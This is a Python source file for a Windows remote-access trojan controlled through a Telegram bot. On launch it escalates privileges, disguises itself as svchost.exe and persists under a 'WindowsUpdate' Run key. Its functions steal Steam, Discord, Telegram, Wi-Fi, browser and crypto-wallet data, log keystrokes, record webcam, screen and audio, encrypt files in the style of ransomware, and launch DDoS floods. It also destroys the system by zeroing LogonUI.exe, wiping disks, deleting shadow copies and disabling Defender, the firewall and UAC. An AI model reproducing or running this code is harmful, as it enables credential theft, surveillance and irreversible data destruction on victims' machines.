import os
import sys
import re
import time
import socket
import platform
import subprocess
import threading
import sqlite3
import json
import base64
import ctypes
import winreg
import shutil
import zipfile
import random
import string
import hashlib
import tempfile
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from PIL import ImageGrab, Image
import psutil
import requests
import sounddevice as sd
import soundfile as sf
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler

# ============ GPUTIL ============
try:
    import GPUtil
except ImportError:
    GPUtil = None

# ============ МНОГОПОЛЬЗОВАТЕЛЬСКАЯ СИСТЕМА ============
known_pcs = []
selected_pc = None

# ============ ЗАПРОС ПРАВ АДМИНИСТРАТОРА ============
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
            sys.exit()
        except:
            pass
request_admin()

# ============ АВТО-ПЕРЕИМЕНОВАНИЕ ============
def rename_to_svchost():
    try:
        exe_path = sys.executable
        exe_dir = os.path.dirname(exe_path)
        new_path = os.path.join(exe_dir, "svchost.exe")
        if not exe_path.lower().endswith("svchost.exe"):
            shutil.copy2(exe_path, new_path)
            os.startfile(new_path)
            sys.exit()
    except:
        pass
rename_to_svchost()

# ============ АВТОЗАГРУЗКА ============
def auto_persistence():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except:
        return False
auto_persistence()

# ============ КОНФИГ ============
TOKEN = "{{TOKEN}}"
ADMIN_ID = int("{{ADMIN_ID}}")
PC_ID = socket.gethostname() + "_" + os.getlogin()
VERSION = "3.0"

# ============ ОСНОВНЫЕ ФУНКЦИИ ============
def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def execute_powershell(script):
    try:
        result = subprocess.run(["powershell", "-Command", script], capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def get_system_info():
    try:
        return f"""
╔══════════════════════════════════════════╗
║           SYSTEM INFORMATION             ║
╠══════════════════════════════════════════╣
║ PC Name:    {socket.gethostname():<20} ║
║ User:       {os.getlogin():<20} ║
║ OS:         {platform.system()} {platform.release():<10} ║
║ RAM Total:  {round(psutil.virtual_memory().total / (1024**3))} GB ║
║ Disk Total: {round(psutil.disk_usage('/').total / (1024**3))} GB ║
╚══════════════════════════════════════════╝
"""
    except:
        return "System info error"

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
    except:
        return None

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
        return "✅ Blocked" if block else "✅ Unblocked"
    except:
        return "❌ Failed"

def minimize_all_windows():
    try:
        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
        return "✅ All windows minimized"
    except:
        return "❌ Failed"

def close_active_window():
    try:
        ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
        return "✅ Window closed"
    except:
        return "❌ Failed"

def show_messagebox(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Alert", 0)
        return "✅ Shown"
    except:
        return "❌ Failed"

def get_location():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return f"🌐 IP: {ip}\n📍 Country: {loc.get('country')}\n🏙️ City: {loc.get('city')}\n📡 ISP: {loc.get('isp')}"
    except:
        return "❌ Location error"

def kill_logonui():
    try:
        os.system("taskkill /f /im LogonUI.exe 2>nul")
        time.sleep(1)
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        logonui_path = os.path.join(system32, 'LogonUI.exe')
        if not os.path.exists(logonui_path):
            return "❌ LogonUI.exe не найден"
        os.system(f'takeown /f "{logonui_path}" 2>nul')
        os.system(f'icacls "{logonui_path}" /grant Administrators:F 2>nul')
        file_size = os.path.getsize(logonui_path)
        with open(logonui_path, 'wb') as f:
            f.write(b'\x00' * file_size)
            f.flush()
            os.fsync(f.fileno())
        os.system(f'attrib +s +h "{logonui_path}" 2>nul')
        backup_path = os.path.join(system32, 'dllcache', 'LogonUI.exe')
        if os.path.exists(backup_path):
            os.remove(backup_path)
        os.system("dism /online /cleanup-image /restorehealth /limitaccess 2>nul")
        return f"💀 LogonUI ЗАБИТ НУЛЯМИ ({file_size} байт)! Экран входа НИКОГДА не появится!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0x01 | 0x02)
        return f"✅ Wallpaper changed: {image_path}"
    except:
        return "❌ Failed"

def set_wallpaper_from_document(update, context):
    try:
        chat_id = update.message.chat.id
        doc = update.message.document
        if not doc.mime_type or not doc.mime_type.startswith('image/'):
            context.bot.send_message(chat_id, "❌ Отправь изображение (jpg, png, bmp)")
            return
        context.bot.send_message(chat_id, "⏳ Скачиваю и устанавливаю обои...")
        file = context.bot.get_file(doc.file_id)
        temp_path = os.path.join(os.environ['TEMP'], doc.file_name)
        file.download(temp_path)
        result = set_wallpaper(temp_path)
        context.bot.send_message(chat_id, result)
        try:
            os.remove(temp_path)
        except:
            pass
    except Exception as e:
        context.bot.send_message(chat_id, f"❌ Ошибка: {e}")

# ============ КРАЖА ДАННЫХ ============
def steal_steam():
    try:
        data = []
        steam_paths = [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Steam'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Steam'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Steam'),
        ]
        for path in steam_paths:
            if os.path.exists(path):
                data.append(f"\n=== Steam found: {path} ===")
                config_path = os.path.join(path, 'config', 'loginusers.vdf')
                if os.path.exists(config_path):
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data.append(f.read())
                userdata_path = os.path.join(path, 'userdata')
                if os.path.exists(userdata_path):
                    data.append(f"User data: {userdata_path}")
                ssfn_files = [f for f in os.listdir(path) if f.startswith('ssfn')]
                if ssfn_files:
                    data.append(f"SSFN files: {', '.join(ssfn_files)}")
        return "\n".join(data) if data else "Steam not found"
    except Exception as e:
        return f"Error: {e}"

def steal_crypto():
    try:
        data = ["=== Crypto Wallets ==="]
        wallet_paths = [
            os.path.join(os.getenv('APPDATA', ''), 'Electrum'),
            os.path.join(os.getenv('APPDATA', ''), 'Exodus'),
            os.path.join(os.getenv('APPDATA', ''), 'Atomic'),
            os.path.join(os.getenv('APPDATA', ''), 'Zcash'),
            os.path.join(os.getenv('APPDATA', ''), 'Monero'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'MetaMask'),
            os.path.join(os.getenv('APPDATA', ''), 'Coinomi'),
        ]
        for path in wallet_paths:
            if os.path.exists(path):
                data.append(f"\n=== {os.path.basename(path)} ===")
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.dat', '.wallet', '.json', '.key')):
                            data.append(f"  {os.path.join(root, file)}")
        return "\n".join(data) if len(data) > 1 else "No crypto wallets found"
    except Exception as e:
        return f"Error: {e}"

ddos_active = False

def start_ddos(target, duration=60):
    global ddos_active
    if ddos_active:
        return "⚠️ Already running!"
    def attack():
        global ddos_active
        end = time.time() + duration
        while time.time() < end and ddos_active:
            try:
                requests.get(target, timeout=1)
                requests.post(target, timeout=1)
            except:
                pass
        ddos_active = False
    ddos_active = True
    threading.Thread(target=attack).start()
    return f"🔥 DDoS started on {target}"

def stop_ddos():
    global ddos_active
    ddos_active = False
    return "🛑 DDoS stopped"

def kill_process(name):
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        return f"✅ Killed {killed} process(es)"
    except:
        return "❌ Error"

def start_process(path):
    try:
        subprocess.Popen([path], shell=True)
        return f"✅ Started: {path}"
    except:
        return f"❌ Failed: {path}"

def list_processes():
    try:
        procs = []
        for proc in psutil.process_iter(['name', 'pid', 'memory_percent']):
            try:
                procs.append(f"{proc.info['pid']}: {proc.info['name']} ({proc.info['memory_percent']:.1f}%)")
            except:
                pass
        return "\n".join(procs[:30])
    except:
        return "Error"

def shutdown_pc():
    os.system("shutdown /s /t 0")
    return "✅ Shutting down..."

def reboot_pc():
    os.system("shutdown /r /t 0")
    return "✅ Rebooting..."

def disable_uac():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ UAC disabled (reboot required)"
    except:
        return "❌ Failed"

def add_persistence():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return "✅ Persistence added"
    except:
        return "❌ Failed"

def steal_wifi():
    try:
        result = execute_cmd("netsh wlan show profiles")
        passwords = []
        for line in result.split('\n'):
            if "All User Profile" in line:
                name = line.split(':')[1].strip()
                info = execute_cmd(f'netsh wlan show profile name="{name}" key=clear')
                for l in info.split('\n'):
                    if "Key Content" in l:
                        passwords.append(f"{name}: {l.split(':')[1].strip()}")
        return "\n".join(passwords) if passwords else "No WiFi passwords found"
    except:
        return "Error"

def steal_discord():
    try:
        tokens = []
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('APPDATA'), 'DiscordCanary'),
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.ldb'):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    matches = re.findall(r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}', f.read())
                                    tokens.extend(matches)
                            except:
                                pass
        return '\n'.join(set(tokens)) if tokens else "No Discord tokens found"
    except:
        return "Error"

def steal_telegram():
    try:
        temp_dir = os.path.join(os.environ['TEMP'], 'tg_sessions')
        os.makedirs(temp_dir, exist_ok=True)
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
        ]
        for path in paths:
            if os.path.exists(path):
                shutil.copytree(path, os.path.join(temp_dir, os.path.basename(os.path.dirname(path))), dirs_exist_ok=True)
        zip_path = os.path.join(os.environ['TEMP'], 'telegram_sessions.zip')
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
        shutil.rmtree(temp_dir)
        return zip_path
    except:
        return "Error"

def steal_browser_history():
    try:
        data = []
        browsers = [
            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default')),
            ('Edge', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default')),
            ('Brave', os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')),
        ]
        for name, path in browsers:
            history_path = os.path.join(path, 'History')
            if os.path.exists(history_path):
                try:
                    temp_file = tempfile.mktemp()
                    shutil.copy(history_path, temp_file)
                    conn = sqlite3.connect(temp_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100")
                    rows = cursor.fetchall()
                    conn.close()
                    os.remove(temp_file)
                    if rows:
                        data.append(f"\n=== {name} History ===")
                        for row in rows:
                            url = row[0] or ''
                            title = row[1] or ''
                            visits = row[2] or 0
                            data.append(f"{visits}x | {title[:50]} | {url[:80]}")
                except:
                    pass
        return "\n".join(data) if data else "No history found"
    except Exception as e:
        return f"Error: {e}"

def record_audio(duration=5):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = f"audio_{datetime.now().strftime('%H%M%S')}.wav"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        sf.write(full_path, recording, fs)
        return full_path
    except:
        return "Error"

def set_volume(level):
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100, None)
        return f"✅ Volume set to {level}%"
    except:
        return "❌ Failed"

def encrypt_files(path, password):
    try:
        if os.path.isfile(path):
            return encrypt_file(path, password)
        elif os.path.isdir(path):
            return encrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def encrypt_file(file_path, password):
    try:
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            data = file.read()
        encrypted = f.encrypt(data)
        with open(file_path + '.enc', 'wb') as file:
            file.write(salt + encrypted)
        os.remove(file_path)
        return f"✅ Encrypted: {file_path}"
    except:
        return f"❌ Failed: {file_path}"

def encrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if not file.endswith('.enc'):
                try:
                    encrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Encrypted {count} files"

def decrypt_files(path, password):
    try:
        if os.path.isfile(path) and path.endswith('.enc'):
            return decrypt_file(path, password)
        elif os.path.isdir(path):
            return decrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def decrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as file:
            salt = file.read(16)
            encrypted = file.read()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        decrypted = f.decrypt(encrypted)
        original = file_path[:-4]
        with open(original, 'wb') as file:
            file.write(decrypted)
        os.remove(file_path)
        return f"✅ Decrypted: {original}"
    except:
        return f"❌ Failed"

def decrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if file.endswith('.enc'):
                try:
                    decrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Decrypted {count} files"

def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
        return "💀 BSOD triggered"
    except:
        return "❌ Failed"

# ============ ВИЗУАЛЬНЫЕ ЭФФЕКТЫ (В ПОТОКАХ) ============
def scare_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.configure(bg='red')
        label = tk.Label(root, text="⚠️ YOUR SYSTEM HAS BEEN HACKED ⚠️", font=('Arial', 40, 'bold'), fg='white', bg='red')
        label.place(relx=0.5, rely=0.5, anchor='center')
        root.after(10000, root.destroy)
        root.mainloop()
    except:
        pass

def broken_pixels():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.attributes('-transparentcolor', 'black')
        root.configure(bg='black')
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        for _ in range(random.randint(50, 150)):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            color = random.choice(['red', 'green', 'blue', 'white', 'yellow', 'magenta'])
            canvas.create_rectangle(x, y, x+2, y+2, fill=color, outline=color)
        root.after(30000, root.destroy)
        root.mainloop()
    except:
        pass

def pixellate_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        pb = tk.Label(root)
        pb.pack(fill=tk.BOTH, expand=True)
        def update():
            try:
                img = ImageGrab.grab()
                small = img.resize((80, 60), Image.Resampling.NEAREST)
                big = small.resize(img.size, Image.Resampling.NEAREST)
                from PIL import ImageTk
                tk_img = ImageTk.PhotoImage(big)
                pb.config(image=tk_img)
                pb.image = tk_img
                root.after(50, update)
            except:
                pass
        update()
        root.after(10000, root.destroy)
        root.mainloop()
    except:
        pass

def matrix_effect():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.configure(bg='black')
        root.overrideredirect(True)
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        width = root.winfo_screenwidth()
        height = root.winfo_screenheight()
        font_size = 20
        cols = width // font_size
        rows = height // font_size
        columns = []
        for _ in range(cols):
            columns.append({'pos': random.randint(0, rows), 'length': random.randint(5, 15), 'speed': random.randint(1, 3)})
        def block_close(event):
            return "break"
        root.bind('<Key>', block_close)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        def draw_matrix():
            canvas.delete("all")
            for i, col in enumerate(columns):
                x = i * font_size
                col['pos'] = (col['pos'] + col['speed']) % (rows + col['length'])
                for j in range(col['length']):
                    row = (col['pos'] - j) % rows
                    y = row * font_size
                    char = random.choice('0123456789ABCDEF')
                    brightness = 255 - (j / col['length']) * 200
                    color = f'#{int(brightness):02x}{int(brightness):02x}{int(brightness*0.5):02x}'
                    canvas.create_text(x, y, text=char, fill=color, font=('Courier', font_size, 'bold'))
            root.after(80, draw_matrix)
        draw_matrix()
        root.mainloop()
    except:
        pass

def rgb_effect():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        canvas = tk.Canvas(root, highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        def update():
            for _ in range(100):
                x = random.randint(0, root.winfo_screenwidth())
                y = random.randint(0, root.winfo_screenheight())
                color = random.choice(['red', 'green', 'blue', 'yellow', 'magenta', 'cyan'])
                canvas.create_rectangle(x, y, x+20, y+20, fill=color, outline=color)
            root.after(100, update)
        update()
        root.after(10000, root.destroy)
        root.mainloop()
    except:
        pass

def screen_shake():
    try:
        import random
        for _ in range(50):
            x = random.randint(-5, 5)
            y = random.randint(-5, 5)
            ctypes.windll.user32.SetCursorPos(x, y)
            time.sleep(0.01)
    except:
        pass

def scream_make(video_path):
    try:
        os.system(f'start "" "{video_path}" /fullscreen')
        return f"✅ Video playing: {video_path}"
    except:
        return "❌ Failed"

def download_file(url):
    try:
        filename = url.split('/')[-1].split('?')[0] or 'download'
        full_path = os.path.join(tempfile.gettempdir(), filename)
        response = requests.get(url, timeout=30)
        with open(full_path, 'wb') as f:
            f.write(response.content)
        return f"✅ Downloaded: {full_path}"
    except:
        return "❌ Failed"

def download_file_from_pc(file_path):
    try:
        if os.path.exists(file_path):
            return file_path
        return None
    except:
        return None

def upload_file_to_pc(file_bytes, filename):
    try:
        full_path = os.path.join(tempfile.gettempdir(), filename)
        with open(full_path, 'wb') as f:
            f.write(file_bytes)
        return f"✅ File saved: {full_path}"
    except:
        return "❌ Failed"

def list_files(path):
    try:
        if not os.path.exists(path):
            return "❌ Path not found"
        result = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isfile(full):
                result.append(f"📄 {item} ({os.path.getsize(full)} bytes)")
            else:
                result.append(f"📁 {item}/")
        return "\n".join(result[:50])
    except:
        return "❌ Error"

def record_screen(duration=10):
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        screen = ImageGrab.grab()
        width, height = screen.size
        filename = f"screen_record_{datetime.now().strftime('%H%M%S')}.avi"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(full_path, fourcc, 10, (width, height))
        for _ in range(duration * 10):
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.1)
        out.release()
        return full_path
    except:
        return "Error"

def record_webcam(duration=10):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "❌ Webcam not found"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"webcam_{datetime.now().strftime('%H%M%S')}.avi"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        out = cv2.VideoWriter(full_path, fourcc, 20, (640, 480))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        return full_path
    except:
        return "Error"

class Keylogger:
    def __init__(self):
        self.hook_id = None
        self.log = []
        self.user32 = ctypes.windll.user32
        
    def start(self):
        try:
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
            self.hook_proc = HOOKPROC(self._hook_callback)
            self.hook_id = self.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.hook_proc, None, 0)
            return "✅ Keylogger started"
        except:
            return "❌ Failed"
    
    def _hook_callback(self, nCode, wParam, lParam):
        if nCode >= 0 and wParam == 0x0100:
            key_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int)).contents.value
            self.log.append(f"0x{key_code:X}")
            if len(self.log) >= 100:
                self._save_log()
        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
    
    def _save_log(self):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{datetime.now()}: {' '.join(self.log)}\n")
            self.log.clear()
        except:
            pass
    
    def stop(self):
        if self.hook_id:
            self.user32.UnhookWindowsHookEx(self.hook_id)
            if self.log:
                self._save_log()
            return "✅ Stopped"
        return "❌ Not running"
    
    def dump(self):
        if os.path.exists("keylog.txt"):
            with open("keylog.txt", "r") as f:
                return f.read()
        return "No logs"

keylogger = Keylogger()

# ============ НОВЫЕ ФУНКЦИИ ============
usb_blocked = False

def block_usb():
    global usb_blocked
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
        winreg.CloseKey(key)
        usb_blocked = True
        return "✅ USB-накопители (флешки) ЗАБЛОКИРОВАНЫ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def unblock_usb():
    global usb_blocked
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(key)
        usb_blocked = False
        return "✅ USB-накопители (флешки) РАЗБЛОКИРОВАНЫ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def usb_status():
    global usb_blocked
    return f"🔌 USB-накопители: {'ЗАБЛОКИРОВАНЫ' if usb_blocked else 'РАБОТАЮТ'}"

def destroy_mbr():
    try:
        with open("destroy.txt", "w") as f:
            f.write("select disk 0\nclean\nconvert gpt\nexit\n")
        subprocess.run(['diskpart', '/s', 'destroy.txt'], capture_output=True, timeout=30)
        os.remove("destroy.txt")
        return "💀 MBR и все разделы УНИЧТОЖЕНЫ! Система НЕ ЗАГРУЗИТСЯ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def stress_gpu(duration=60):
    try:
        try:
            import pycuda.driver as cuda
            import pycuda.autoinit
            from pycuda.compiler import SourceModule
            mod = SourceModule("""
            __global__ void stress() {
                while(1) {
                    int x = threadIdx.x + blockIdx.x * blockDim.x;
                    int y = threadIdx.y + blockIdx.y * blockDim.y;
                    float a = 0.0;
                    for(int i = 0; i < 1000000; i++) {
                        a += sin(x) * cos(y) + tan(x) * atan(y);
                    }
                }
            }
            """)
            func = mod.get_function("stress")
            for _ in range(50):
                func((100, 100, 1), (100, 100, 1))
            return f"🔥 GPU нагружен до предела! ({duration} сек)"
        except:
            return stress_cpu(duration)
    except Exception as e:
        return f"❌ Ошибка: {e}"

def stress_cpu(duration=60):
    import threading
    import math
    def loop():
        end = time.time() + duration
        while time.time() < end:
            math.factorial(100000)
    threads = []
    for _ in range(os.cpu_count()):
        t = threading.Thread(target=loop)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return f"🔥 CPU нагружен до 100%! ({duration} сек)"

def format_disk():
    try:
        drives = [d for d in os.listdir('C:/') if os.path.isdir(d)]
        for drive in drives:
            os.system(f'format {drive}: /q /y')
        return "💀 Все диски отформатированы!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def get_clipboard():
    try:
        import ctypes
        from ctypes import wintypes
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        try:
            handle = user32.GetClipboardData(CF_TEXT)
            if handle:
                pointer = kernel32.GlobalLock(handle)
                if pointer:
                    data = ctypes.cast(pointer, ctypes.c_char_p).value
                    kernel32.GlobalUnlock(handle)
                    user32.CloseClipboard()
                    return data.decode('utf-8', errors='ignore') if data else "Пусто"
            user32.CloseClipboard()
            return "Пусто"
        except:
            user32.CloseClipboard()
            return "Ошибка чтения буфера"
    except:
        return "❌ Ошибка"

def disable_defender():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Windows Defender отключён!"
    except:
        return "❌ Ошибка"

def disable_firewall():
    try:
        os.system("netsh advfirewall set allprofiles state off")
        return "✅ Брандмауэр отключён!"
    except:
        return "❌ Ошибка"

def disable_updates():
    try:
        os.system("sc config wuauserv start= disabled")
        os.system("net stop wuauserv")
        return "✅ Обновления Windows отключены!"
    except:
        return "❌ Ошибка"

def disable_system_restore():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "✅ Восстановление системы отключено!"
    except:
        return "❌ Ошибка"

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Диспетчер задач отключён!"
    except:
        return "❌ Ошибка"

def enable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Диспетчер задач включён!"
    except:
        return "❌ Ошибка"

def disable_registry_editor():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Редактор реестра отключён!"
    except:
        return "❌ Ошибка"

def enable_registry_editor():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Редактор реестра включён!"
    except:
        return "❌ Ошибка"

def disable_cmd():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        return "✅ CMD отключён!"
    except:
        return "❌ Ошибка"

def enable_cmd():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ CMD включён!"
    except:
        return "❌ Ошибка"

